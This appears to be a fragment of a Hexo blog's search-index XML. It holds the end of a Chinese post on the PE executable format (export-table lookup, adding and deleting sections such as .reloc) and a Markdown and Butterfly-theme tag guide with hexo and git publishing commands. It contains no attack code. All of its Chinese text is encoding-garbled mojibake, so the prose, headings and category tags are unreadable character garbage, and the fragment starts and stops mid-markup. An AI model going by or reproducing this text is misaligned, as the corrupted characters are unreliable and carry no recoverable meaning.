class="symbol">Base:</span>åºå·çš„åŸºå‡†å€¼ï¼Œåºå·å‡baseå€¼æ¥è°ƒç”¨è¿™ä¸ªæ¨¡å—</span><br></pre></td></tr></table></figure><p>ä½œç”¨æ–¹å¼ï¼š</p><p>1ï¼‰é€šè¿‡åç§°ï¼šå½“ç¨‹åºå‘ç°ä¸€ä¸ªå‡½æ•°è°ƒç”¨ä¸åœ¨å†…éƒ¨æ—¶ï¼Œä¼šæŸ¥æ‰¾dllæ˜¯å¦åŒ…å«è¿™ä¸ªå‡½æ•°ï¼Œå¦‚æœåŒ…å«ï¼Œå°±ä¼šç”¨åç§°å…ˆä»AddressOfNamesä¸­æ¯”è¾ƒå¯»æ‰¾æ‰€éœ€å‡½æ•°åœ°å€ï¼Œç”¨å¾—åˆ°çš„ç´¢å¼•å†åœ¨AddressOfNameOrdinalsä¸­å¾—åˆ°åºå·ï¼Œç”¨åºå·åœ¨AddressOfFunctionsæ‰¾åˆ°å¯¹åº”çš„åœ°å€è¿›å…¥ã€‚ç„¶åå°±ä¼šè¿æ¥åœ°å€ä¸è¿™ä¸ªå‡½æ•°ã€‚ä¹‹æ‰€ä»¥è¿™ä¹ˆéº»çƒ¦æ˜¯å› ä¸ºä¸€ä¸ªå‡½æ•°å¯èƒ½è¢«å¤šä¸ªç¨‹åºä½¿ç”¨ï¼Œä¸€ä¸ªç¨‹åºä¹Ÿå¯èƒ½ä½¿ç”¨å¤šä¸ªåŠ¨æ€é“¾æ¥åº“ã€‚æŸ¥æ‰¾åç§°ä¹Ÿå¯ä»¥ä¿è¯å³ä½¿æœ‰æ–°ç‰ˆæœ¬ï¼Œæ—§ç¼–è¯‘çš„ç¨‹åºä¹Ÿå¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</p><p>è¯¥ç»“æ„ä½“æ•°ç»„å­˜åœ¨åœ¨PEä½“ä¸­ï¼ŒRVAå­˜åœ¨äºDataDirectory[1].VirtualAddressï¼ˆå‰4å­—èŠ‚ï¼‰ï¼Œå4å­—èŠ‚æ˜¯å¤§å°ã€‚</p><h3 id="å…³äºä¿®æ”¹PEæ–‡ä»¶">å…³äºä¿®æ”¹PEæ–‡ä»¶</h3><p>æ·»åŠ èŠ‚åŒºï¼š</p><p>æ·»åŠ èŠ‚åŒºé¦–å…ˆè¦åŠ èŠ‚åŒºå¤´ï¼Œä½¿æ–‡ä»¶èƒ½è¯†åˆ«åˆ°è¿™ä¸ªèŠ‚åŒºï¼Œç”±äºä¸€ä¸ªèŠ‚åŒºå¤´å¤§å°ä¸º40å­—èŠ‚ï¼ˆ</p><p><code>èŠ‚è¡¨èµ·å§‹ä½ç½® = DOSå¤´çš„e_lfanewå­—æ®µå€¼ + sizeof(IMAGE_NT_HEADERS)</code></p><p><code>èŠ‚è¡¨å¤§å° = æ–‡ä»¶å¤´çš„NumberOfSectionså­—æ®µå€¼ * sizeof(IMAGE_SECTION_HEADER)</code></p><p>ç”¨è¿™ä¸ªå…¬å¼è®¡ç®—èŠ‚è¡¨åæ˜¯å¦<strong>å¤§äº</strong>40å­—èŠ‚ï¼Œé˜²æ­¢æˆªæ–­ï¼Œå¦‚æœå¯ä»¥æ”¾å…¥ä¸€ä¸ªèŠ‚åŒºå¤´å°±æ”¾å…¥ï¼Œå¦‚æœä¸è¡Œï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼šä¸€ä¸ªæ˜¯åˆ æ‰doså­˜æ ¹ï¼ŒæŠŠåé¢çš„peå¤´éƒ¨åˆ†å‰ç§»ï¼Œåœ¨åé¢çš„ä½ç½®åŠ èŠ‚åŒºå¤´ï¼Œè¿™æ—¶è¦æ³¨æ„IMAGE_DOS_HEADER çš„e_flanewè¦ä¿®æ”¹ä¸ºNTå¤´çš„åç§»ï¼Œå› ä¸ºNTå¤´ç§»åŠ¨è¿‡ï¼Œä¸è¿‡ä¸ç”¨ç®¡å¯¹é½ï¼Œå› ä¸ºå¹¶æ²¡æœ‰æ›´æ”¹æ–‡ä»¶å¤§å°å’ŒèŠ‚åŒºä½ç½®ï¼Œåªè¦æ³¨æ„åé¢åŠ çš„èŠ‚åŒºå°±å¯ä»¥äº†ã€‚ç¬¬äºŒä¸ªæ˜¯åœ¨èŠ‚è¡¨åé¢åŠ æ•°æ®ï¼Œè®©å®ƒå˜é•¿ï¼Œè¿™å°±è¦åœ¨SizeOfHeaderé‡Œé¢å¢åŠ å­—èŠ‚ï¼Œåœ¨å¤šå‡ºæ¥çš„åœ°æ–¹å†™èŠ‚åŒºå¤´ï¼Œä½†æ˜¯è¿™æ ·è¦æŠŠæ¯ä¸ªèŠ‚åŒºå¤´é‡Œçš„åç§»è°ƒåˆ°å¯¹åº”çš„åç§»ï¼Œå› ä¸ºèŠ‚åŒºå¤´æ•°æ®å˜å¤šä¹‹åï¼ŒèŠ‚åŒºçš„åœ°å€ç›¸åº”å¢åŠ äº†é‚£ä¹ˆå¤šã€‚ä½†è¦æ³¨æ„å¢åŠ çš„å­—èŠ‚å¿…é¡»è¦å¯¹é½ä¸ºæœ€å°å•ä½çš„å€æ•°ã€‚</p><p>è¿˜è¦æŠŠNumberOfSections+1ï¼Œå¯é€‰å¤´ä¸­çš„sizeOfImageåŠ å¯¹åº”çš„å€¼</p><p>åˆ é™¤èŠ‚åŒºï¼š</p><blockquote><p>ç›´æ¥0å¡«å……å¯¹åº”èŠ‚åŒºå¤´ï¼Œå°±è¯†åˆ«ä¸åˆ°èŠ‚åŒºå•¦ã€‚ç„¶åè¦æŠŠNumberOfSections-1.</p></blockquote><p>å€’æ˜¯å¯ä»¥è¿™æ ·ï¼Œä½†æ˜¯çœŸçš„è¦åˆ é™¤èŠ‚åŒºçš„è¯ï¼Œå‚è€ƒã€Šé€†æ ¸ã€‹17.2.2åˆ é™¤.relocèŠ‚åŒº(ä½äºæ•´ä¸ªæ–‡ä»¶çš„æœ€å)ï¼š</p><span class='p red'>æ³¨</span>:è¿™é‡Œä½¿ç”¨çš„æ˜¯exeæ–‡ä»¶,å› ä¸ºä¸€èˆ¬exeæ–‡ä»¶æ²¡ç”¨é‡å®šä½èŠ‚ä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œ<ol><li>ä»èŠ‚åŒºå¤´æ‰¾åˆ°relocèŠ‚åŒºèµ·å§‹åç§»ï¼Œè·³è½¬ååˆ é™¤(ç‰©ç†)</li><li>æ–‡ä»¶å¤´ä¸­æœ‰Number of Sectionå¡«å…¥å‡1çš„å€¼(åˆ äº†å‡ ä¸ªå°±å‡å‡ )</li><li>å¯é€‰å¤´ä¸­æœ‰æ•´ä¸ªè®°å½•æ˜ åƒå¤§å°çš„Size of Image,åœ¨èŠ‚åŒºå¤´ä¸­æ‰¾åˆ°.relocèŠ‚åŒºçš„å¤§å°RawDataSizeè®©æ˜ åƒå¤§å°çš„å€¼å‡å»è¿™ä¸ªå€¼</li></ol>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> å­¦ä¹  </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdownè¯­æ³•ä¸å¤–æŒ‚æ ‡ç­¾å†™æ³•æ±‡æ€»</title>
      <link href="/posts/2013454d.html"/>
      <url>/posts/2013454d.html</url>
      
        <content type="html"><![CDATA[<h1>1.Markdownè¯­æ³•è‡ªå¸¦æ ¼å¼</h1><div class="note info flat"><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/u014061630/article/details/81359144">Markdownè¯­æ³•å›¾æ–‡å…¨é¢è¯¦è§£(10åˆ†é’Ÿå­¦ä¼š)</a></p></div><div class="note warning flat"><p>æ³¨æ„ï¼šæ­¤é¡µé¢å¶å°”ä¼šå­˜åœ¨CSSå†²çªé—®é¢˜!</p></div><h2 id="1-1-ä»£ç å—">1.1 ä»£ç å—</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\```shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCodeç»ˆç«¯</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmderç»ˆç«¯</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br><span class="line">\```</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCodeç»ˆç«¯</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmderç»ˆç«¯</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-2-å¤šçº§æ ‡é¢˜">1.2 å¤šçº§æ ‡é¢˜</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><p>è§æœ¬æ–‡ç« æ ‡é¢˜!</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-3-æ–‡å­—æ ·å¼">1.3 æ–‡å­—æ ·å¼</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>ä¸‹åˆ’çº¿æ¼”ç¤º<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">æ–‡å­—<span class="strong">**åŠ ç²—**</span>æ¼”ç¤º</span><br><span class="line"></span><br><span class="line">æ–‡å­—<span class="emphasis">*æ–œä½“*</span>æ¼”ç¤º</span><br><span class="line"></span><br><span class="line">æ–‡æœ¬<span class="code">`é«˜äº®`</span>æ¼”ç¤º</span><br><span class="line"></span><br><span class="line">æ–‡æœ¬~~åˆ é™¤~~çº¿æ¼”ç¤º</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span> = <span class="string">5</span>&gt;</span></span>5å·å­—<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;é»‘ä½“&quot;</span>&gt;</span></span>é»‘ä½“<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>è“è‰²<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">MistyRose</span>&gt;</span></span>è¿™é‡Œçš„èƒŒæ™¯è‰²æ˜¯ï¼šMistyRosenï¼Œæ­¤å¤„è¾“å…¥ä»»æ„æƒ³è¾“å…¥çš„å†…å®¹<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><p><u>ä¸‹åˆ’çº¿æ¼”ç¤º</u></p><p>æ–‡å­—<strong>åŠ ç²—</strong>æ¼”ç¤º</p><p>æ–‡å­—<em>æ–œä½“</em>æ¼”ç¤º</p><p>æ–‡æœ¬<code>é«˜äº®</code>æ¼”ç¤º</p><p>æ–‡æœ¬<s>åˆ é™¤</s>çº¿æ¼”ç¤º</p><p><font size = 5>5å·å­—</font><br><font face="é»‘ä½“">é»‘ä½“</font><br><font color=blue>è“è‰²</font></p><table><tr><td bgcolor=MistyRose>è¿™é‡Œçš„èƒŒæ™¯è‰²æ˜¯ï¼šMistyRosenï¼Œæ­¤å¤„è¾“å…¥ä»»æ„æƒ³è¾“å…¥çš„å†…å®¹</td></tr></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note info flat"><p>ä¸Šè¿°è¦ç‚¹å¯å‚è€ƒ:<a href="https://blog.csdn.net/qq_43732429/article/details/108034518">ã€Markdownè¯­æ³•ã€‘å­—ä½“é¢œè‰²å¤§å°åŠæ–‡å­—åº•è‰²è®¾ç½®</a></p></div><h2 id="1-4-å¼•ç”¨">1.4 å¼•ç”¨</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt;  Java</span></span><br><span class="line"><span class="quote">&gt; äºŒçº§å¼•ç”¨æ¼”ç¤º</span></span><br><span class="line"><span class="quote">&gt; MySQL</span></span><br><span class="line"><span class="quote">&gt; &gt;å¤–é”®</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;äº‹åŠ¡</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;<span class="strong">**è¡Œçº§é”**</span>(å¼•ç”¨å†…éƒ¨ä¸€æ ·å¯ä»¥ç”¨æ ¼å¼)</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; ....</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><blockquote><p>Java<br>äºŒçº§å¼•ç”¨æ¼”ç¤º<br>MySQL</p><blockquote><p>å¤–é”®</p><p>äº‹åŠ¡</p><p><strong>è¡Œçº§é”</strong>(å¼•ç”¨å†…éƒ¨ä¸€æ ·å¯ä»¥ç”¨æ ¼å¼)</p></blockquote><p>â€¦</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-5-åˆ†å‰²çº¿">1.5 åˆ†å‰²çº¿</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><hr><hr><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-6-åˆ—è¡¨-è·Ÿç©ºæ ¼éƒ½å¯ä»¥">1.6 åˆ—è¡¨(*,+,-è·Ÿç©ºæ ¼éƒ½å¯ä»¥)</h2><h3 id="1-6-1-æ— åºåˆ—è¡¨">1.6.1 æ— åºåˆ—è¡¨</h3><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> Java</span><br><span class="line"><span class="bullet">*</span> Python</span><br><span class="line"><span class="bullet">*</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Java</span><br><span class="line"><span class="bullet">+</span> Python</span><br><span class="line"><span class="bullet">+</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> Java</span><br><span class="line"><span class="bullet">-</span> Python</span><br><span class="line"><span class="bullet">-</span> ...</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ul><li>Java</li><li>Python</li><li>â€¦</li></ul><ul><li>Java</li><li>Python</li><li>â€¦</li></ul><ul><li>Java</li><li>Python</li><li>â€¦</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="1-6-2-æœ‰åºåˆ—è¡¨">1.6.2 æœ‰åºåˆ—è¡¨</h3><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># æ³¨æ„åé¢æœ‰ç©ºæ ¼</span></span><br><span class="line"><span class="bullet">1.</span> </span><br><span class="line"><span class="bullet">2.</span> </span><br><span class="line"><span class="bullet">3.</span> </span><br><span class="line"><span class="bullet">4.</span> </span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li></li><li></li><li></li><li></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-7-å›¾ç‰‡">1.7 å›¾ç‰‡</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># æœ¬åœ°å›¾ç‰‡</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/assets/pusheencode.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;ç¤ºä¾‹å›¾ç‰‡&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:50%;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="section"># åœ¨çº¿å›¾ç‰‡</span></span><br><span class="line">![<span class="string">code</span>](<span class="link">https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><p>æœ¬åœ°å›¾ç‰‡:<br><img src="/assets/pusheencode.webp" alt="ç¤ºä¾‹å›¾ç‰‡" style="zoom:50%;" /><br>åœ¨çº¿å›¾ç‰‡:<br><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png" alt="code"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-8-è¡¨æ ¼">1.8 è¡¨æ ¼</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| é¡¹ç›®æ ‡å· | èµ„é‡‘     | å¤‡æ³¨ |</span><br><span class="line">| -------- | -------- | ---- |</span><br><span class="line">| 1        | 100ï¼Œ000 | æ—    |</span><br><span class="line">| 2        | 200ï¼Œ000 | æ—    |</span><br><span class="line">| 3        | 300,600  | é‡è¦ |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><table><thead><tr><th>é¡¹ç›®æ ‡å·</th><th>èµ„é‡‘</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>1</td><td>100ï¼Œ000</td><td>æ— </td></tr><tr><td>2</td><td>200ï¼Œ000</td><td>æ— </td></tr><tr><td>3</td><td>300,600</td><td>é‡è¦</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-9-å…¬å¼">1.9 å…¬å¼</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\Gamma(z)=\int<span class="emphasis">_0^\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt.</span></span><br><span class="line"><span class="emphasis">$$</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><p>$$<br>\Gamma(z)=\int_0^\infty t^{z-1}e^{-t}dt.<br>$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1>2.Butterflyå¤–æŒ‚æ ‡ç­¾</h1><div class="note info flat"><p>è¿™éƒ¨åˆ†å‚è€ƒå®‰çŸ¥é±¼:<a href="https://anzhiy.cn/posts/7d58.html">åŸºäºButterflyçš„å¤–æŒ‚æ ‡ç­¾å¼•å…¥</a></p></div><h2 id="2-1-è¡Œå†…æ–‡æœ¬æ ·å¼-text">2.1 è¡Œå†…æ–‡æœ¬æ ·å¼ text</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% u æ–‡æœ¬å†…å®¹ %&#125;</span><br><span class="line">&#123;% emp æ–‡æœ¬å†…å®¹ %&#125;</span><br><span class="line">&#123;% wavy æ–‡æœ¬å†…å®¹ %&#125;</span><br><span class="line">&#123;% del æ–‡æœ¬å†…å®¹ %&#125;</span><br><span class="line">&#123;% kbd æ–‡æœ¬å†…å®¹ %&#125;</span><br><span class="line">&#123;% psw æ–‡æœ¬å†…å®¹ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> å¸¦ &#123;% u ä¸‹åˆ’çº¿ %&#125; çš„æ–‡æœ¬</span><br><span class="line"><span class="bullet">2.</span> å¸¦ &#123;% emp ç€é‡å· %&#125; çš„æ–‡æœ¬</span><br><span class="line"><span class="bullet">3.</span> å¸¦ &#123;% wavy æ³¢æµªçº¿ %&#125; çš„æ–‡æœ¬</span><br><span class="line"><span class="bullet">4.</span> å¸¦ &#123;% del åˆ é™¤çº¿ %&#125; çš„æ–‡æœ¬</span><br><span class="line"><span class="bullet">5.</span> é”®ç›˜æ ·å¼çš„æ–‡æœ¬ &#123;% kbd command %&#125; + &#123;% kbd D %&#125;</span><br><span class="line"><span class="bullet">6.</span> å¯†ç æ ·å¼çš„æ–‡æœ¬ï¼š&#123;% psw è¿™é‡Œæ²¡æœ‰éªŒè¯ç  %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i 